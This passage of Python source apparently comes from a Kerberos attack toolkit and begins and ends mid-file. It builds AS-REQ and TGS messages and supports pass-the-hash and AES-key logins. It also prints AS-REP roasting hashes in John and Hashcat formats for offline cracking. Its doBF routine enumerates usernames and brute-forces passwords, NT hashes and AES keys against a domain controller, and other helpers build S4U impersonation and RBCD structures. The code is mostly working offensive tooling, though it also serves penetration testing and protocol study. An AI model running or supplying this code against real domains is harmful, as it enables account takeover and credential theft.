			if (encType == int(EncryptionTypes.rc4_hmac.value)):
				# asRepEncryptionKey = truncateKey (fullKey, 16)
				print ("\t" * (indent+1) + '[-] RC4 key truncation documentation missing. It is different from AES', file = sys.stderr)
				return
			elif (encType == int(EncryptionTypes.aes256_cts_hmac_sha1_96.value)): # eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
				asRepEncryptionKey = truncateKey (fullKey, 32)
			elif (encType == int(EncryptionTypes.aes128_cts_hmac_sha1_96.value)): # eTYPE-AES128-CTS-HMAC-SHA1-96 (17)
				asRepEncryptionKey = truncateKey (fullKey, 16)

			# The AS-Rep Encryption Key will be used as the User Secret Key

			userSecretKey = asRepEncryptionKey

		# Basic authentication

		else: 
			# Setup AS-REQ

			asReq = AS_REQ()
			asReq['pvno'] = 5
			asReq['msg-type'] = int(ApplicationTagNumbers.AS_REQ.value)

			asReq['padata'] = noValue
			asReq['padata'][0] = noValue
			asReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
		
			# Include PA-PAC-REQUEST into PADATA

			pacRequest = PA_PAC_REQUEST()
			pacRequest['include-pac'] = requestPAC
			encodedPacRequest = encoder.encode(pacRequest)
			asReq['padata'][0]['padata-value'] = encodedPacRequest

			# Setup REQ-BODY

			reqBody = seq_set(asReq, 'req-body')
			opts = list()
			opts.append(KDCOptionsVals.forwardable.value)
			opts.append(KDCOptionsVals.renewable.value)
			opts.append(KDCOptionsVals.proxiable.value)
			reqBody['kdc-options'] = encodeFlags(opts)
			clientNamePrincipal = PrincipalObj(clientName, type = PrincipalNameType.NT_PRINCIPAL.value)
			seq_set(reqBody, 'cname', clientNamePrincipal.components_to_asn1)
			domain = domain.upper()
			serverName = PrincipalObj('krbtgt/%s' % domain, type = PrincipalNameType.NT_SRV_INST.value)
			reqBody['realm'] = domain
			seq_set(reqBody, 'sname', serverName.components_to_asn1)
			now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
			reqBody['till'] = KerberosTimeObj.to_asn1(now)
			reqBody['rtime'] = KerberosTimeObj.to_asn1(now)
			reqBody['nonce'] = random.getrandbits(31)
			if ntHash != '' or password != '': # We can try to request etype 23
				supportedCiphers = (int(EncryptionTypes.rc4_hmac.value),)
			else: # We have to request etype 17/18
				if aesKey != None:
					if len(aesKey) == 32*2:
						supportedCiphers = (int(EncryptionTypes.aes256_cts_hmac_sha1_96.value),)
					else:
						supportedCiphers = (int(EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
				else:
					supportedCiphers = (int(EncryptionTypes.rc4_hmac.value),) # No creds but we can hope for no Kerberos pre-authentication ...

			seq_set_iter(reqBody, 'etype', supportedCiphers)

			# Send 1st AS-REQ

			message = encoder.encode(asReq)

			if userEnum:
				try:
					r = sendReceive(message, domain, kdcHost)
				except:
					raise
			else:
				try:
					r = sendReceive(message, domain, kdcHost)
				except KerberosError as e:
					if e.getErrorCode() == ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value: # We must use etype 17/18 if we have required keys
						if aesKey != None:
							if len(aesKey) == 32*2:
								supportedCiphers = (int(EncryptionTypes.aes256_cts_hmac_sha1_96.value),)
							else:
								supportedCiphers = (int(EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
							seq_set_iter(reqBody, 'etype', supportedCiphers)
							message = encoder.encode(asReq)
							r = sendReceive(message, domain, kdcHost)
						else:
							raise
					else:
						raise

			# Received KDC_ERR_PREAUTH_REQUIRED or AS-REP if principal do not require Kerberos pre-authentication

			preAuth = True
			try:
				asRep = decoder.decode(r, asn1Spec = KRB_ERROR())[0]
			except:
				asRep = decoder.decode(r, asn1Spec = AS_REP())[0]
				preAuth = False

			# Compute User Secret Key based on encryption type (should have required credentials) or PTH/PTK
			# Salt is a fixed value and can be directly computed

			encType = supportedCiphers[0]
			if password == '' and ntHash == '' and aesKey == None:
				print("\t" * indent + "[-] No password, NT hash or AES key provided", file = sys.stderr)
				userSecretKey = b''
			else:
				if (clientName.endswith("$")):
					SALT = domain.upper() + "host" + clientName[:-1].lower() + "." + domain.lower()
				else:
					SALT = domain.upper() + clientName
				if encType == int(EncryptionTypes.rc4_hmac.value):
					if ntHash != '':
						userSecretKey = ntHash
					else:
						userSecretKey = hashlib.new ("md4", password.encode("utf-16le")).hexdigest()
				elif encType == int(EncryptionTypes.aes128_cts_hmac_sha1_96.value):
					if aesKey != None and len(aesKey) == 16*2:
						userSecretKey = aesKey
					else:
						SEEDSIZE = 16
						ENCTYPE = 17
						BLOCKSIZE = 16
						userSecretKey = string_to_key (password, SALT, None, SEEDSIZE, BLOCKSIZE, ENCTYPE)
				elif encType == int(EncryptionTypes.aes256_cts_hmac_sha1_96.value):
					if aesKey != None and len(aesKey) == 32*2:
						userSecretKey = aesKey
					else:
						SEEDSIZE = 32
						ENCTYPE = 18
						BLOCKSIZE = 16
						userSecretKey = string_to_key (password, SALT, None, SEEDSIZE, BLOCKSIZE, ENCTYPE)
				userSecretKey = binascii.unhexlify(userSecretKey)

			if preAuth:
				if userSecretKey == b'':
					print("\t" * indent + f"[-] Kerberos pre-authentication required for '{clientName}' and no credentials provided", file = sys.stderr)
					return

				# Compute PA-ENC-TIMESTAMP for building 2nd AS-REQ
				
				timeStamp = PA_ENC_TS_ENC()
				now = datetime.datetime.utcnow()
				timeStamp['patimestamp'] = KerberosTimeObj.to_asn1(now)
				timeStamp['pausec'] = now.microsecond
				encodedTimeStamp = encoder.encode(timeStamp)
				KEYUSAGE = 1
				encTimeStamp = ENCTYPE_TABLE[encType].encrypt(userSecretKey, KEYUSAGE, None, encodedTimeStamp)
				encryptedData = EncryptedData()
				encryptedData['etype'] = encType
				encryptedData['cipher'] = encTimeStamp
				encodedEncryptedData = encoder.encode(encryptedData)

				# Build 2nd AS-REQ with PA-ENC-TIMESTAMP

				asReq = AS_REQ()
				asReq['pvno'] = 5
				asReq['msg-type'] =  int(ApplicationTagNumbers.AS_REQ.value)
				asReq['padata'] = noValue
				asReq['padata'][0] = noValue
				asReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
				asReq['padata'][0]['padata-value'] = encodedEncryptedData
				asReq['padata'][1] = noValue
				asReq['padata'][1]['padata-type'] = int(PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
				asReq['padata'][1]['padata-value'] = encodedPacRequest
				reqBody = seq_set(asReq, 'req-body')
				reqBody['kdc-options'] = encodeFlags(opts)
				seq_set(reqBody, 'cname', clientNamePrincipal.components_to_asn1)
				reqBody['realm'] = domain
				seq_set(reqBody, 'sname', serverName.components_to_asn1)
				now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
				reqBody['till'] = KerberosTimeObj.to_asn1(now)
				reqBody['rtime'] = KerberosTimeObj.to_asn1(now)
				reqBody['nonce'] = random.getrandbits(31)
				seq_set_iter(reqBody, 'etype', ((encType,)))

				# Send 2nd AS-REQ

				message = encoder.encode(asReq)
				try:
					r = sendReceive(message, domain, kdcHost)
				except Exception as e:
					raise
			else:	
				# Output the TGT encrypted part in John/Hashcat format for cracking

				print("\t" * indent + f"[+] Kerberos pre-authentication not required for '{clientName}'")
				if encType == int(EncryptionTypes.aes256_cts_hmac_sha1_96.value) or \
					encType == int(EncryptionTypes.aes128_cts_hmac_sha1_96.value):
					print("\t" * (indent+1) + "[+] Hash (John format) = $krb5asrep$%d$%s@%s:%s$%s" % (encType, clientName, domain,
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode()))
					print("\t" * (indent+1) + "[+] Hash (Hashcat format) = $krb5asrep$%d$%s@%s:%s$%s" % (encType, clientName, domain,
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode()))
				else:
					print("\t" * (indent+1) + "[+] Hash (John format) = $krb5asrep$%s@%s:%s$%s" % (clientName, domain,
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
					print("\t" * (indent+1) + "[+] Hash (Hashcat format) = $krb5asrep$%d$%s@%s:%s$%s" % (encType, clientName, domain,
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
													binascii.hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

		# We should have AS-REP in response which contain TGT
		# Save as CCACHE if requested and credentials provided
		# Then return AS-REP, cipher, User Secret Key, Client-to-TGS Session Key

		if userSecretKey == b'':
			print("\t" * indent + "[-] AS-REP received but no credentials provided to retrieve Client-to-TGS Session Key", file = sys.stderr)
			return
		else:
			asRep = decoder.decode(r, asn1Spec = AS_REP())[0]
			cipherText = asRep['enc-part']['cipher']
			KEYUSAGE = 3
			plainText, confounder = ENCTYPE_TABLE[encType].decrypt(userSecretKey, KEYUSAGE, cipherText)
			encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
			cipher = ENCTYPE_TABLE[encASRepPart['key']['keytype']]
			clientTGSSessionKey = encASRepPart['key']['keyvalue'].asOctets()

			print("\t" * indent + "[+] User Secret Key (or AS-Rep Encryption Key) = {}".format(binascii.hexlify(userSecretKey).decode()))
			print("\t" * indent + "[+] Client-to-TGS Session Key = {}".format(binascii.hexlify(clientTGSSessionKey).decode()))

			if save:
				ccache = CCache()
				ccache.fromASREP(r, userSecretKey)

				if addToCCACHE == None: # Create a new CCACHE
					ccacheName = clientName + '.ccache'
					ccache.saveFile(ccacheName)
					print("\t" * indent + f"[+] '{ccacheName}' saved")
				else: # Add TGT to existing CCACHE
					ccache2 = CCache.loadFile(addToCCACHE)
					ccache2.credentials += ccache.credentials
					ccache2.saveFile(addToCCACHE)
					print("\t" * indent + f"[+] TGT added to '{addToCCACHE}'")

			return r, cipher, userSecretKey, clientTGSSessionKey
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getKDCTime(kdcHost):
	print_yellow("[*] Getting KDC UTC Time")
	print_yellow("---")
	print()

	try:
		if kdcHost == None:
			print("[-] Target KDC required")
			return

		# Setup AS-REQ

		asReq = AS_REQ()
		asReq['pvno'] = 5
		asReq['msg-type'] = int(ApplicationTagNumbers.AS_REQ.value)

		asReq['padata'] = noValue
		asReq['padata'][0] = noValue
		asReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
	
		# Include PA-PAC-REQUEST into PADATA

		pacRequest = PA_PAC_REQUEST()
		pacRequest['include-pac'] = True
		encodedPacRequest = encoder.encode(pacRequest)
		asReq['padata'][0]['padata-value'] = encodedPacRequest

		# Setup REQ-BODY

		reqBody = seq_set(asReq, 'req-body')
		opts = list()
		opts.append(KDCOptionsVals.forwardable.value)
		opts.append(KDCOptionsVals.renewable.value)
		opts.append(KDCOptionsVals.proxiable.value)
		reqBody['kdc-options'] = encodeFlags(opts)
		clientNamePrincipal = PrincipalObj('user', type = PrincipalNameType.NT_PRINCIPAL.value)
		seq_set(reqBody, 'cname', clientNamePrincipal.components_to_asn1)
		domain = 'domain'.upper()
		serverName = PrincipalObj('krbtgt/%s' % domain, type = PrincipalNameType.NT_SRV_INST.value)
		reqBody['realm'] = domain
		seq_set(reqBody, 'sname', serverName.components_to_asn1)
		now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
		reqBody['till'] = KerberosTimeObj.to_asn1(now)
		reqBody['rtime'] = KerberosTimeObj.to_asn1(now)
		reqBody['nonce'] = random.getrandbits(31)
		supportedCiphers = (int(EncryptionTypes.aes256_cts_hmac_sha1_96.value),)

		seq_set_iter(reqBody, 'etype', supportedCiphers)

		# Send AS-REQ

		message = encoder.encode(asReq)
		targetHost = kdcHost

		messageLen = pack('!i', len(message))

		try:
			af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
			s = socket.socket(af, socktype, proto)
			s.connect(sa)
		except socket.error as e:
			raise socket.error("[-] Connection error (%s:%s)" % (targetHost, 88), e)

		s.sendall(messageLen + message)

		recvDataLen = unpack('!i', s.recv(4))[0]

		r = s.recv(recvDataLen)
		while len(r) < recvDataLen:
			r += s.recv(recvDataLen - len(r))

		try:
			for i in decoder.decode(r):
				if type(i) == Sequence:
					for k in vars(i)["_componentValues"]:
						if type(k) == GeneralizedTime:
							time = datetime.datetime.strptime(k.asOctets().decode("utf-8"), "%Y%m%d%H%M%SZ").strftime("%d/%m/%Y %H:%M:%S %p")
							print("[+] KDC UTC Time = {}".format(time))
							break
		except:
			print("[-] Unable to retrieve KDC UTC Time", file = sys.stderr)
			pass
		print("[+] Client UTC Time = {}".format(datetime.datetime.utcnow().strftime(("%d/%m/%Y %H:%M:%S %p"))))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##############################################
#               Brute Force                  #
##############################################

def doBF(kdcHost, usernames, passwords, domain, nthashes, aeskeys, passLogin, userEnum):
	print_yellow("[*] Brute Force Kerberos server")
	print_yellow("---")
	print()
 
	try:
		usernamesA = []
		if usernames != '':
			try:
				with open(usernames, "r") as f:
					usernamesA = [username[:-1] for username in f.readlines()]
			except:
				usernamesA = [usernames]
		
		passwordsA = []
		if passwords != '':
			try:
				with open(passwords, "r") as f:
					passwordsA = [password[:-1] for password in f.readlines()]
			except:
				passwordsA = [passwords]
		
		nthashesA = []
		if nthashes != '':
			try:
				with open(nthashes, "r") as f:
					nthashesA = [nthash[:-1] for nthash in f.readlines()]
			except:
				nthashesA = [nthashes]
		
		aeskeysA = []
		if aeskeys != None and aeskeys != '':
			try:
				with open(aeskeys, "r") as f:
					aeskeysA = [aeskey[:-1] for aeskey in f.readlines()]
			except:
				aeskeysA = [aeskeys]

		for username in usernamesA:

			originalSTDOUT = sys.stdout
			originalSTDERR = sys.stderr
			capturedSTDOUT = StringIO()
			sys.stdout = capturedSTDOUT
			capturedSTDERR = StringIO()
			sys.stderr = capturedSTDERR

			if userEnum:
				_ = requestTGT(kdcHost, username, username, domain, '', None, None, None, None, True, False, None, 1, True)
				err = capturedSTDERR.getvalue()
				capturedSTDERR.truncate(0)
				capturedSTDERR.seek(0)
				out = capturedSTDOUT.getvalue()
				capturedSTDOUT.truncate(0)
				capturedSTDOUT.seek(0)

				sys.stdout = originalSTDOUT
				sys.stderr = originalSTDERR

				if (err.find("KDC_ERR_C_PRINCIPAL_UNKNOWN") != -1):
					print(f"[-] User {username} does not exist", file = sys.stderr)
				else:
					if err.find("Connection error") == -1: # Unless network connection error, KDC should leaks valid usernames
						print(f"[+] Valid user {username} found")
					else:
						print(err.replace('Got error', f"Got error for {username}"), file = sys.stderr)
				
				maybeSleep()

				sys.stdout = capturedSTDOUT
				sys.stderr = capturedSTDERR
			
			else: # Authenticate with PA-ENC-TIMESTAMP

				if passLogin:
					_ = requestTGT(kdcHost, username, username, domain, '', None, None, None, None, True, False, None, 1, False)
					err = capturedSTDERR.getvalue()
					capturedSTDERR.truncate(0)
					capturedSTDERR.seek(0)
					out = capturedSTDOUT.getvalue()
					capturedSTDOUT.truncate(0)
					capturedSTDOUT.seek(0)

					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR

					if err.find("AS-REP received") != -1 or out.find("Client-to-TGS Session Key") != -1:
						print(f"[+] Valid account found {username}:{username}")
					elif err.find("KDC_ERR_CLIENT_REVOKED") != -1:
						print(f"[-] Account locked out/disabled {username}:{username}", file = sys.stderr)
					elif err.find("KDC_ERR_C_PRINCIPAL_UNKNOWN") != -1:
						print(f"[-] User {username} does not exist", file = sys.stderr)
					elif err.find("KDC_ERR_PREAUTH_FAILED") != -1:
						print(f"[-] Invalid account {username}:{username}", file = sys.stderr)
					else:
						print(err.replace('Got error', f"Got error for {username}:{username}"), file = sys.stderr)

					maybeSleep()

					sys.stdout = capturedSTDOUT
					sys.stderr = capturedSTDERR

				for password in passwordsA:
					_ = requestTGT(kdcHost, username, password, domain, '', None, None, None, None, True, False, None, 1, False)
					err = capturedSTDERR.getvalue()
					capturedSTDERR.truncate(0)
					capturedSTDERR.seek(0)
					out = capturedSTDOUT.getvalue()
					capturedSTDOUT.truncate(0)
					capturedSTDOUT.seek(0)

					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR

					if err.find("AS-REP received") != -1 or out.find("Client-to-TGS Session Key") != -1:
						print(f"[+] Valid account found {username}:{password}")
					elif err.find("KDC_ERR_CLIENT_REVOKED") != -1:
						print(f"[-] Account locked out/disabled {username}:{password}", file = sys.stderr)
					elif err.find("KDC_ERR_C_PRINCIPAL_UNKNOWN") != -1:
						print(f"[-] User {username} does not exist", file = sys.stderr)
					elif err.find("KDC_ERR_PREAUTH_FAILED") != -1:
						print(f"[-] Invalid account {username}:{password}", file = sys.stderr)
					else:
						print(err.replace('Got error', f"Got error for {username}:{password}"), file = sys.stderr)

					maybeSleep()

					sys.stdout = capturedSTDOUT
					sys.stderr = capturedSTDERR

				for nthash in nthashesA:
					_ = requestTGT(kdcHost, username, '', domain, nthash, None, None, None, None, True, False, None, 1, False)
					err = capturedSTDERR.getvalue()
					capturedSTDERR.truncate(0)
					capturedSTDERR.seek(0)
					out = capturedSTDOUT.getvalue()
					capturedSTDOUT.truncate(0)
					capturedSTDOUT.seek(0)

					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR

					if err.find("AS-REP received") != -1 or out.find("Client-to-TGS Session Key") != -1:
						print(f"[+] Valid account found {username}:{nthash}")
					elif err.find("KDC_ERR_CLIENT_REVOKED") != -1:
						print(f"[-] Account locked out/disabled {username}:{nthash}", file = sys.stderr)
					elif err.find("KDC_ERR_C_PRINCIPAL_UNKNOWN") != -1:
						print(f"[-] User {username} does not exist", file = sys.stderr)
					elif err.find("KDC_ERR_PREAUTH_FAILED") != -1:
						print(f"[-] Invalid account {username}:{nthash}", file = sys.stderr)
					else:
						print(err.replace('Got error', f"Got error for {username}:{nthash}"), file = sys.stderr)

					maybeSleep()

					sys.stdout = capturedSTDOUT
					sys.stderr = capturedSTDERR
				
				for aeskey in aeskeysA:
					_ = requestTGT(kdcHost, username, '', domain, '', aeskey, None, None, None, True, False, None, 1, False)
					err = capturedSTDERR.getvalue()
					capturedSTDERR.truncate(0)
					capturedSTDERR.seek(0)
					out = capturedSTDOUT.getvalue()
					capturedSTDOUT.truncate(0)
					capturedSTDOUT.seek(0)

					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR

					if err.find("AS-REP received") != -1 or out.find("Client-to-TGS Session Key") != -1:
						print(f"[+] Valid account found {username}:{aeskey}")
					elif err.find("KDC_ERR_CLIENT_REVOKED") != -1:
						print(f"[-] Account locked out/disabled {username}:{aeskey}", file = sys.stderr)
					elif err.find("KDC_ERR_C_PRINCIPAL_UNKNOWN") != -1:
						print(f"[-] User {username} does not exist", file = sys.stderr)
					elif err.find("KDC_ERR_PREAUTH_FAILED") != -1:
						print(f"[-] Invalid account {username}:{aeskey}", file = sys.stderr)
					else:
						print(err.replace('Got error', f"Got error for {username}:{aeskey}"), file = sys.stderr)

					maybeSleep()

					sys.stdout = capturedSTDOUT
					sys.stderr = capturedSTDERR

			sys.stdout = originalSTDOUT
			sys.stderr = originalSTDERR

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###############################
### Ticket Granting Service ###
###############################

def decryptPATGSREQAuthenticator(encType, hexClientTGSSessionKey, hexAuthenticatorCipher, hexASRepEncKey = ""):
	print_yellow("[*] Decrypting PA-TGS-REQ Authenticator")
	print_yellow("---")
	print()

	try:
		if encType == None or hexClientTGSSessionKey == None:
			print("[-] Encryption type and Client-to-TGS Session Key required", file = sys.stderr)
			return

		KEYUSAGE = 7

		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexClientTGSSessionKey), KEYUSAGE, binascii.unhexlify (hexAuthenticatorCipher))
		authenticator = decoder.decode (cipherDecrypted, asn1Spec = Authenticator())[0]
		vno = authenticator['authenticator-vno']
		crealm = authenticator['crealm']
		cname = str(authenticator['cname'][1][0])
		if 'cksum' in authenticator:
			cksumType = str(authenticator['cksum']['cksumtype'])
			cksum = binascii.hexlify(authenticator['cksum']['checksum'].asOctets()).decode()
		else:
			cksum = "<Empty>"
		cusec = authenticator['cusec']
		ctime = datetime.datetime.strptime (str(authenticator['ctime']), "%Y%m%d%H%M%SZ")
		if 'subkey' in authenticator and authenticator['subkey'].isValue:
			subKeyType = authenticator['subkey']['keytype']
			subKey = binascii.hexlify(authenticator['subkey']['keyvalue'].asOctets()).decode()
		else:
			subKey = "<Empty>"
		if 'seq-number' in authenticator and authenticator['seq-number'].isValue:
			seqNumber = authenticator['seq-number']
		else:
			seqNumber = "<Empty>"
		if 'authorization-data' in authenticator and len(authenticator['authorization-data']) > 0:
			authDataType = authenticator['authorization-data'][0]['ad-type']
			authData = binascii.hexlify(authenticator['authorization-data'][0]['ad-data'].asOctets()).decode()
		else:
			authData = "<Empty>"
		print ("[+] Authenticator version number = {}".format (vno))
		print ("[+] Realm = {}".format (crealm))
		print ("[+] Client name = {}".format (cname))
		if cksum != "<Empty>":
			print ("[+] Checksum")
			print(f"\t[+] Checksum Type = {cksumType}")
			print(f"\t[+] Checksum Value = {cksum}")
		else:
			print("[+] Checksum = <Empty>")
		print ("[+] UTC Date = {}".format (ctime))
		print ("[+] UTC Date microseconds = {}".format (cusec))
		if subKey != "<Empty>":
			print ("[+] Subkey")
			print(f"\t[+] Subkey Type = {subKeyType}")
			print(f"\t[+] Subkey Value = {subKey}")
		else:
			print ("[+] Subkey = <Empty>")
		print ("[+] Sequence number = {}".format (seqNumber))
		if authData != "<Empty>":
			print ("[+] Authorization data")
			print(f"\t[+] Authorization data Type = {authDataType}")
			print(f"\t[+] Authorization data Value = {authData}")
		else:
			print ("[+] Authorization data = <Empty>")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def KERB_CHECKSUM_HMAC_MD5 (Key, messageType, ToHash):
	ksign = HMAC.new (Key, b'signaturekey\0', MD5).digest()
	md5hash = MD5.new (pack ('<I', messageType) + ToHash).digest()
	return HMAC.new (ksign, md5hash, MD5).digest()

def buildPAFORUSER(hexClientTGSSessionKey, realm, cnameToImpersonate):
	print_yellow("[*] Building PA-FOR-USER")
	print_yellow("---")
	print()

	try:
		if hexClientTGSSessionKey == None:
			print("[-] Client-to-TGS Session Key required", file = sys.stderr)
			return

		KEYUSAGE = 17

		def EncodeData (key, keyusage, realm, cname):
			S4UByteArray = pack ('<I', 1) + cname + realm + b"Kerberos"
			checksum = KERB_CHECKSUM_HMAC_MD5 (key, keyusage, S4UByteArray)

			paForUserEnc = PA_FOR_USER_ENC()
			paForUserEnc.setComponentByName ('userName')
			paForUserEnc.getComponentByName ('userName').setComponentByName ('name-type', 1)
			paForUserEnc.getComponentByName ('userName').setComponentByName ('name-string')
			paForUserEnc.getComponentByName ('userName').getComponentByName ('name-string').setComponentByPosition (0, cname)
			paForUserEnc['userRealm'] = realm
			paForUserEnc.setComponentByName ('cksum')
			paForUserEnc['cksum']['cksumtype'] = -138
			paForUserEnc['cksum']['checksum'] = checksum
			paForUserEnc['auth-package'] = 'Kerberos'

			return encoder.encode (paForUserEnc)

		paForUserEnc = EncodeData (binascii.unhexlify (hexClientTGSSessionKey), KEYUSAGE, realm.encode(), cnameToImpersonate.encode())
		print ("[+] Build PA-FOR-USER Value = {}".format (binascii.hexlify (paForUserEnc).decode()))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def buildPAPACOPTIONS():
	print_yellow("[*] Building PA-PAC-OPTIONS")
	print_yellow("---")
	print()

	try:
		paPacOptions = PA_PAC_OPTIONS()
		finalFlags = list()
		for i in range (0,32):
			finalFlags.append (0,)
		finalFlags[3] = 1 # RBCD bit offset
		paPacOptions['flags'] = finalFlags
		paPacOptionsEnc = encoder.encode (paPacOptions)
		print ("[+] PA-PAC-OPTIONS Value = {}".format (binascii.hexlify (paPacOptionsEnc).decode()))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def decryptSTEncPart(encType, hexServiceSecretKey, hexClientTGSSessionKey, hexSTEncPart, hexASRepEncKey = None):
	print_yellow("[*] Decrypting ST encrypted part")
	print_yellow("---")
	print()

	try:
		if encType == None or (hexServiceSecretKey == None and hexClientTGSSessionKey == None):
			print("[-] Encryption type and Service Secret Key/Client-to-TGS Session Key required", file = sys.stderr)
			return

		KEYUSAGE = 2

		if hexServiceSecretKey == None:
			hexServiceSecretKey = hexClientTGSSessionKey
		
		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexServiceSecretKey), KEYUSAGE, binascii.unhexlify (hexSTEncPart))
		STEncPart = decoder.decode (cipherDecrypted, asn1Spec = EncTicketPart())[0]
		flagsDecoded = TicketFlagsDecoder (int ("0b" + str (STEncPart['flags']), 2))
		flags = []
		for k in TicketFlagsEnum:
			if ((flagsDecoded >> (31 - k.value)) & 1) == 1:
				flags.append(TicketFlagsEnum(k.value).name)
		sessionKey = binascii.hexlify(STEncPart['key']['keyvalue'].asOctets()).decode()
		crealm = STEncPart['crealm']
		cname = STEncPart['cname']['name-string'][0]
		if (len (STEncPart['transited']['contents']) > 0):
			transited = binascii.hexlify(STEncPart['transited']['contents'].asOctets()).decode()
		else:
			transited = '<Empty>'
		authTime = datetime.datetime.strptime (str (STEncPart['authtime']), "%Y%m%d%H%M%SZ")
		if "starttime" in STEncPart:
			startTime = datetime.datetime.strptime (str (STEncPart['starttime']), "%Y%m%d%H%M%SZ")
		else:
			startTime = "<Empty>"
		endTime = datetime.datetime.strptime (str (STEncPart['endtime']), "%Y%m%d%H%M%SZ")
		if "renew-till" in STEncPart:
			renewTill = datetime.datetime.strptime (str (STEncPart['renew-till']), "%Y%m%d%H%M%SZ")
		else:
			renewTill = "<Empty>"
		if "caddr" in STEncPart and len (STEncPart['caddr']) > 0:
			caddr = binascii.hexlify(STEncPart['caddr'][0]['address'].asOctets()).decode()
		else:
			caddr = '<Empty>'
		print ("[+] Flags = ({}) {}".format (hex(flagsDecoded), ", ".join(flags)))
		print ("[+] Client-to-Service Session Key = {}".format (sessionKey))
		print ("[+] Realm = {}".format (crealm))
		print ("[+] Client name = {}".format (cname))
		print ("[+] Transited = {}".format (transited))
		print ("[+] UTC Authentication time = {}".format (authTime))
		print ("[+] UTC Start time = {}".format (startTime))
		print ("[+] UTC End time = {}".format (endTime))
		print ("[+] UTC End renew time = {}".format (renewTill))
		print ("[+] Client address = {}".format (caddr))

		if "authorization-data" in STEncPart and len (STEncPart['authorization-data']) > 0:
			authData = STEncPart['authorization-data'][0]['ad-data'].asOctets()
			adIfRelevant = decoder.decode (authData, asn1Spec = AD_IF_RELEVANT())[0]
			PAC = adIfRelevant[0]['ad-data'].asOctets()
			print("--------------- Authorization data PAC ---------------")
			if hexASRepEncKey != None:
				hexASRepEncKey = [hexASRepEncKey]
			parsePAC(PAC, hexASRepEncKey)
		else:
			print ("[+] Authorization data = <Empty>")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def decryptTGSRepEncPart(encType, hexClientTGSSessionKey, hexTGSRepEncPart):
	print_yellow("[*] Decrypting TGS-Rep encrypted part")
	print_yellow("---")
	print()

	try:
		if encType == None or hexClientTGSSessionKey == None:
			print("[-] Encryption type and Client-to-TGS Session Key required", file = sys.stderr)

		KEYUSAGE = 8

		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexClientTGSSessionKey), KEYUSAGE, binascii.unhexlify (hexTGSRepEncPart))
		TGSRepPart = decoder.decode (cipherDecrypted, asn1Spec = EncTGSRepPart())[0]
		sessionKey = binascii.hexlify(TGSRepPart['key']['keyvalue'].asOctets()).decode()
		lastReq = datetime.datetime.strptime (str (TGSRepPart['last-req'][0]['lr-value']), "%Y%m%d%H%M%SZ")
		nonce = TGSRepPart['nonce']
		if "key-expiration" in TGSRepPart:
			keyExpiration = datetime.datetime.strptime (str (TGSRepPart['key-expiration']), "%Y%m%d%H%M%SZ")
		else:
			keyExpiration = '<Empty>'
		flagsDecoded = TicketFlagsDecoder (int ("0b" + str (TGSRepPart['flags']), 2))
		flags = []
		for k in TicketFlagsEnum:
			if ((flagsDecoded >> (31 - k.value)) & 1) == 1:
				flags.append(TicketFlagsEnum(k.value).name)
		authTime = datetime.datetime.strptime (str (TGSRepPart['authtime']), "%Y%m%d%H%M%SZ")
		if "starttime" in TGSRepPart:
			startTime = datetime.datetime.strptime (str (TGSRepPart['starttime']), "%Y%m%d%H%M%SZ")
		else:
			startTime = "<Empty>"
